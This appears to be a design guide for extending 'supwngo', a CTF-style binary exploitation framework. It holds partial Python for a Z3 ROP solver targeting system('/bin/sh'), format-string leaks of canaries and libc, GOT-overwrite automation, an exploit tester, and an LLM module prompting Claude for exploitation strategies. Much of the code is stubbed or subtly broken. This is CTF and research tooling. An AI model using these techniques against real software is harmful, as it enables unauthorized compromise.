# supwngo - Quick Wins Implementation Guide

These are high-impact features that can be implemented relatively quickly to significantly improve the framework's capabilities.

---

## 1. Z3-Based ROP Chain Solver (1-2 weeks)

**Impact:** Automatically find optimal ROP gadget chains
**Effort:** Medium
**Dependencies:** z3-solver

### Implementation

```python
# supwngo/exploit/rop/z3_solver.py

from z3 import *
from dataclasses import dataclass
from typing import List, Optional, Dict

@dataclass
class GadgetEffect:
    """Describes what a gadget does to registers/memory."""
    sets: Dict[str, int]      # reg -> value (if constant)
    reads_stack: int          # Bytes read from stack
    stack_delta: int          # RSP change after gadget
    clobbers: List[str]       # Registers destroyed

class Z3ROPSolver:
    """
    SMT-based ROP chain solver.

    Given a goal (e.g., call system("/bin/sh")), finds the minimal
    gadget chain that achieves it.
    """

    def __init__(self, gadgets: List['Gadget'], arch: str = 'amd64'):
        self.gadgets = gadgets
        self.arch = arch
        self.solver = Optimize()

        # Register names for architecture
        self.arg_regs = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'] if arch == 'amd64' else ['edi', 'esi', 'edx', 'ecx']

    def solve_call(
        self,
        target_addr: int,
        args: List[int],
        bad_chars: bytes = b"",
        max_chain_len: int = 20
    ) -> Optional['ROPChain']:
        """
        Find gadget chain to call target_addr with given arguments.

        Example:
            solver.solve_call(
                target_addr=libc.sym['system'],
                args=[libc.search(b'/bin/sh').__next__()],
                bad_chars=b'\x00\n'
            )
        """
        # Symbolic state for each step
        chain_len = Int('chain_len')
        self.solver.add(chain_len >= 1)
        self.solver.add(chain_len <= max_chain_len)

        # Minimize chain length
        self.solver.minimize(chain_len)

        # For each possible chain position, create symbolic choice
        for i in range(max_chain_len):
            gadget_choice = Int(f'gadget_{i}')
            self.solver.add(gadget_choice >= 0)
            self.solver.add(gadget_choice < len(self.gadgets))

        # Track register state symbolically
        reg_state = {reg: Int(f'{reg}_final') for reg in self.arg_regs}

        # Constraint: argument registers have correct values
        for i, arg in enumerate(args):
            if i < len(self.arg_regs):
                self.solver.add(reg_state[self.arg_regs[i]] == arg)

        # Bad character constraints
        for gadget in self.gadgets:
            if any(bc in gadget.address.to_bytes(8, 'little') for bc in bad_chars):
                # Mark gadget as unusable
                pass

        if self.solver.check() == sat:
            model = self.solver.model()
            return self._build_chain_from_model(model)

        return None

    def solve_write_what_where(
        self,
        what: int,
        where: int,
        bad_chars: bytes = b""
    ) -> Optional['ROPChain']:
        """
        Find gadget chain for arbitrary write.

        Looks for patterns like:
        - mov [rdi], rsi; ret
        - mov [rax], rbx; ret
        - xchg patterns
        """
        # Find write gadgets
        write_gadgets = self._find_write_gadgets()

        for gadget in write_gadgets:
            # Try to satisfy preconditions
            chain = self._solve_preconditions(gadget, what, where)
            if chain:
                return chain

        return None


def integrate_z3_solver():
    """Integration with existing ROPChainBuilder."""
    # Add to supwngo/exploit/rop/__init__.py
    pass
```

### Usage Example

```python
from supwngo.exploit.rop import Z3ROPSolver, GadgetFinder

# Find gadgets
finder = GadgetFinder(binary)
gadgets = finder.find_all()

# Create solver
solver = Z3ROPSolver(gadgets)

# Solve for system("/bin/sh")
chain = solver.solve_call(
    target_addr=libc.sym['system'],
    args=[next(libc.search(b'/bin/sh\x00'))],
    bad_chars=b'\x00'
)

print(chain.dump())  # Pretty print chain
payload = chain.build()  # Get bytes
```

---

## 2. LLM-Powered Vulnerability Analysis (1 week)

**Impact:** Find vulnerabilities that static analysis misses
**Effort:** Low-Medium
**Dependencies:** anthropic/openai SDK

### Implementation

```python
# supwngo/ai/llm_analyzer.py

import anthropic
from typing import List, Optional
from dataclasses import dataclass

@dataclass
class LLMFinding:
    vuln_type: str
    confidence: float  # 0-1
    location: str
    description: str
    exploit_hint: str

class LLMVulnAnalyzer:
    """
    Use Claude/GPT to analyze decompiled code for vulnerabilities.
    """

    SYSTEM_PROMPT = """You are an expert binary security researcher.
    Analyze the provided decompiled code for security vulnerabilities.

    Focus on:
    1. Buffer overflows (stack and heap)
    2. Format string vulnerabilities
    3. Integer overflows/underflows
    4. Use-after-free
    5. Race conditions
    6. Command injection
    7. Logic bugs

    For each finding, provide:
    - Type of vulnerability
    - Confidence (0-100%)
    - Exact location (function + line if visible)
    - Brief description
    - Exploitation hint

    Output as JSON array."""

    def __init__(self, api_key: Optional[str] = None):
        self.client = anthropic.Anthropic(api_key=api_key)

    def analyze_function(self, decompiled_code: str) -> List[LLMFinding]:
        """Analyze single decompiled function."""
        response = self.client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=4096,
            system=self.SYSTEM_PROMPT,
            messages=[{
                "role": "user",
                "content": f"Analyze this function:\n\n```c\n{decompiled_code}\n```"
            }]
        )

        return self._parse_findings(response.content[0].text)

    def analyze_binary(self, binary: 'Binary') -> List[LLMFinding]:
        """Analyze all functions in binary."""
        from supwngo.analysis.decompile import GhidraDecompiler

        decompiler = GhidraDecompiler()
        findings = []

        for func in binary.functions:
            decompiled = decompiler.decompile_function(binary.path, func.address)
            if decompiled:
                func_findings = self.analyze_function(decompiled)
                findings.extend(func_findings)

        return self._deduplicate(findings)

    def suggest_exploit_strategy(
        self,
        binary: 'Binary',
        vulnerability: 'Vulnerability'
    ) -> str:
        """Get natural language exploit strategy suggestion."""
        context = f"""
        Binary: {binary.path}
        Architecture: {binary.arch}
        Protections: {binary.protections}

        Vulnerability:
        Type: {vulnerability.vuln_type}
        Location: {vulnerability.location}
        Details: {vulnerability.description}
        """

        response = self.client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=2048,
            messages=[{
                "role": "user",
                "content": f"""Given this vulnerable binary, provide a step-by-step exploitation strategy:

{context}

Include:
1. Information leak strategy (if needed)
2. Protection bypass approach
3. Payload construction
4. Specific gadgets/techniques to use"""
            }]
        )

        return response.content[0].text


# CLI Integration
@click.command()
@click.argument('binary_path')
@click.option('--api-key', envvar='ANTHROPIC_API_KEY')
def llm_analyze(binary_path: str, api_key: str):
    """Analyze binary using LLM."""
    from supwngo import Binary

    binary = Binary(binary_path)
    analyzer = LLMVulnAnalyzer(api_key)

    findings = analyzer.analyze_binary(binary)

    for finding in findings:
        click.echo(f"\n[{finding.confidence*100:.0f}%] {finding.vuln_type}")
        click.echo(f"  Location: {finding.location}")
        click.echo(f"  {finding.description}")
        click.echo(f"  Hint: {finding.exploit_hint}")
```

---

## 3. Automatic Info Leak Finder (1 week)

**Impact:** Automatically find and exploit information leaks
**Effort:** Medium

### Implementation

```python
# supwngo/exploit/auto_leak.py

from dataclasses import dataclass
from typing import List, Optional, Tuple
from enum import Enum

class LeakType(Enum):
    STACK = "stack"
    LIBC = "libc"
    BINARY = "binary"
    HEAP = "heap"
    CANARY = "canary"

@dataclass
class LeakPrimitive:
    """Describes an information leak primitive."""
    leak_type: LeakType
    method: str  # "format_string", "oob_read", "uninitialized", "print_ptr"
    offset: Optional[int]  # For format string: which offset
    control: str  # What input controls the leak

class AutoLeakFinder:
    """
    Automatically find and exploit information leaks.
    """

    def __init__(self, binary: 'Binary', context: 'ExploitContext'):
        self.binary = binary
        self.context = context

    def find_format_string_leaks(self) -> List[LeakPrimitive]:
        """Find format string leak opportunities."""
        leaks = []

        # Look for printf-family calls with user input
        for func in ['printf', 'sprintf', 'fprintf', 'snprintf']:
            if func in self.binary.imports:
                # Find call sites
                for xref in self.binary.get_xrefs(func):
                    if self._arg_is_user_controlled(xref, 0):
                        # Probe for leakable values
                        for offset in range(1, 50):
                            leak_type = self._probe_format_offset(offset)
                            if leak_type:
                                leaks.append(LeakPrimitive(
                                    leak_type=leak_type,
                                    method="format_string",
                                    offset=offset,
                                    control=f"format arg at {hex(xref)}"
                                ))

        return leaks

    def find_print_leaks(self) -> List[LeakPrimitive]:
        """Find puts/printf that might leak addresses."""
        leaks = []

        # Look for prints of pointers
        for func in ['puts', 'printf', 'write']:
            for xref in self.binary.get_xrefs(func):
                # Check if argument could be a pointer we control
                pass

        return leaks

    def auto_leak_libc(
        self,
        tube: 'Tube',
        known_leaks: Optional[List[LeakPrimitive]] = None
    ) -> int:
        """
        Automatically leak libc base using found primitives.

        Returns libc base address.
        """
        leaks = known_leaks or self.find_format_string_leaks()

        for leak in leaks:
            if leak.leak_type == LeakType.LIBC:
                if leak.method == "format_string":
                    # Use format string to leak
                    payload = f"%{leak.offset}$p".encode()
                    tube.sendline(payload)
                    response = tube.recvline()

                    # Parse leaked address
                    leaked = int(response.strip(), 16)

                    # Calculate base
                    libc_base = self._calculate_libc_base(leaked)
                    return libc_base

        raise RuntimeError("No usable libc leak found")

    def auto_leak_canary(self, tube: 'Tube') -> int:
        """Automatically leak stack canary."""
        leaks = self.find_format_string_leaks()

        for leak in leaks:
            if leak.leak_type == LeakType.CANARY:
                payload = f"%{leak.offset}$p".encode()
                tube.sendline(payload)
                response = tube.recvline()
                canary = int(response.strip(), 16)

                # Verify it looks like a canary (ends in 00 on Linux)
                if canary & 0xFF == 0:
                    return canary

        raise RuntimeError("No canary leak found")


# Integration with existing exploit flow
def enhance_auto_exploit():
    """Add auto-leak to existing auto.py."""
    # In AutoExploiter.exploit():
    # 1. First try to find leaks
    # 2. Use leaks to defeat ASLR/canary
    # 3. Then proceed with exploitation
    pass
```

---

## 4. Exploit Verification & Testing (3-5 days)

**Impact:** Automatically verify exploits work
**Effort:** Low

### Implementation

```python
# supwngo/exploit/tester.py

import docker
import subprocess
import tempfile
from dataclasses import dataclass
from typing import Optional
from enum import Enum

class TestResult(Enum):
    SUCCESS = "success"      # Got shell/flag
    CRASH = "crash"          # Crashed but not exploited
    TIMEOUT = "timeout"      # No response
    PARTIAL = "partial"      # Some progress but failed
    FAILED = "failed"        # Exploit didn't work

@dataclass
class ExploitTestResult:
    result: TestResult
    output: str
    duration: float
    shell_obtained: bool

class ExploitTester:
    """
    Automatically test exploits in isolated environments.
    """

    def __init__(self, binary: 'Binary'):
        self.binary = binary
        self.docker = docker.from_env()

    def test_local(
        self,
        exploit_script: str,
        timeout: int = 30
    ) -> ExploitTestResult:
        """Test exploit locally with timeout."""
        import time

        # Write exploit to temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(exploit_script)
            script_path = f.name

        start = time.time()

        try:
            result = subprocess.run(
                ['python3', script_path],
                capture_output=True,
                timeout=timeout,
                text=True
            )

            duration = time.time() - start

            # Check for success indicators
            if 'flag{' in result.stdout or 'CTF{' in result.stdout:
                return ExploitTestResult(
                    result=TestResult.SUCCESS,
                    output=result.stdout,
                    duration=duration,
                    shell_obtained=True
                )

            if result.returncode == 0:
                return ExploitTestResult(
                    result=TestResult.PARTIAL,
                    output=result.stdout,
                    duration=duration,
                    shell_obtained=False
                )

        except subprocess.TimeoutExpired:
            return ExploitTestResult(
                result=TestResult.TIMEOUT,
                output="",
                duration=timeout,
                shell_obtained=False
            )

    def test_in_docker(
        self,
        exploit_script: str,
        libc_version: str = "2.31",
        timeout: int = 60
    ) -> ExploitTestResult:
        """Test exploit in Docker container with specific libc."""

        dockerfile = f"""
        FROM ubuntu:20.04
        RUN apt-get update && apt-get install -y python3 python3-pip
        RUN pip3 install pwntools
        COPY binary /challenge/binary
        COPY exploit.py /exploit.py
        RUN chmod +x /challenge/binary
        CMD ["python3", "/exploit.py"]
        """

        # Build and run container
        # ... implementation

        pass

    def test_remote(
        self,
        exploit_script: str,
        host: str,
        port: int,
        timeout: int = 60
    ) -> ExploitTestResult:
        """Test exploit against remote target."""
        # Modify script to use remote connection
        remote_script = exploit_script.replace(
            'process(',
            f'remote("{host}", {port}  # was process('
        )

        return self.test_local(remote_script, timeout)


# CLI Integration
@click.command()
@click.argument('exploit_script')
@click.option('--binary', required=True)
@click.option('--docker/--local', default=False)
@click.option('--libc', default='2.31')
def test_exploit(exploit_script, binary, docker, libc):
    """Test an exploit script."""
    from supwngo import Binary

    binary_obj = Binary(binary)
    tester = ExploitTester(binary_obj)

    with open(exploit_script) as f:
        script = f.read()

    if docker:
        result = tester.test_in_docker(script, libc)
    else:
        result = tester.test_local(script)

    click.echo(f"Result: {result.result.value}")
    click.echo(f"Duration: {result.duration:.2f}s")
    if result.shell_obtained:
        click.secho("Shell obtained!", fg='green')
```

---

## 5. Enhanced Format String Automation (3-5 days)

**Impact:** One-command format string exploitation
**Effort:** Low

### Implementation

```python
# supwngo/exploit/format_string_auto.py

class FormatStringAutoExploiter:
    """
    Fully automated format string exploitation.
    """

    def __init__(self, binary: 'Binary'):
        self.binary = binary

    def auto_exploit(
        self,
        tube: 'Tube',
        printf_offset: Optional[int] = None
    ) -> bool:
        """
        Automatically exploit format string vulnerability.

        Steps:
        1. Find printf offset (if not provided)
        2. Leak stack canary (if present)
        3. Leak libc address
        4. Overwrite GOT entry with system/one_gadget
        5. Trigger shell
        """
        # Step 1: Find offset
        if printf_offset is None:
            printf_offset = self._find_offset(tube)

        # Step 2: Leak canary if needed
        canary = None
        if self.binary.protections.canary:
            canary = self._leak_canary(tube, printf_offset)

        # Step 3: Leak libc
        libc_base = self._leak_libc(tube, printf_offset)

        # Step 4: Find best target
        target = self._select_target()

        # Step 5: Build and send payload
        if target == "got_overwrite":
            payload = self._build_got_overwrite(libc_base)
        elif target == "ret_overwrite":
            payload = self._build_ret_overwrite(libc_base, canary)

        tube.sendline(payload)

        # Step 6: Trigger
        tube.interactive()
        return True

    def _find_offset(self, tube: 'Tube') -> int:
        """Find format string offset automatically."""
        # Send marker and find where it appears
        marker = 0x41414141

        for offset in range(1, 100):
            payload = f"AAAA%{offset}$p".encode()
            tube.sendline(payload)
            response = tube.recvline()

            if b'0x41414141' in response:
                return offset

        raise RuntimeError("Could not find format string offset")
```

---

## Implementation Priority

| Feature | Impact | Effort | Priority |
|---------|--------|--------|----------|
| Z3 ROP Solver | Very High | 2 weeks | 1 |
| Auto Leak Finder | High | 1 week | 2 |
| LLM Analysis | High | 1 week | 3 |
| Exploit Tester | Medium | 3-5 days | 4 |
| Format String Auto | Medium | 3-5 days | 5 |

---

## Getting Started

1. **Install additional dependencies:**
```bash
pip install z3-solver anthropic docker
```

2. **Create the new module files:**
```bash
mkdir -p supwngo/ai
touch supwngo/ai/__init__.py
touch supwngo/ai/llm_analyzer.py
touch supwngo/exploit/rop/z3_solver.py
touch supwngo/exploit/auto_leak.py
touch supwngo/exploit/tester.py
```

3. **Update imports in `__init__.py` files**

4. **Add CLI commands**

5. **Write tests**

Each of these can be implemented independently and immediately improves the framework's capabilities.
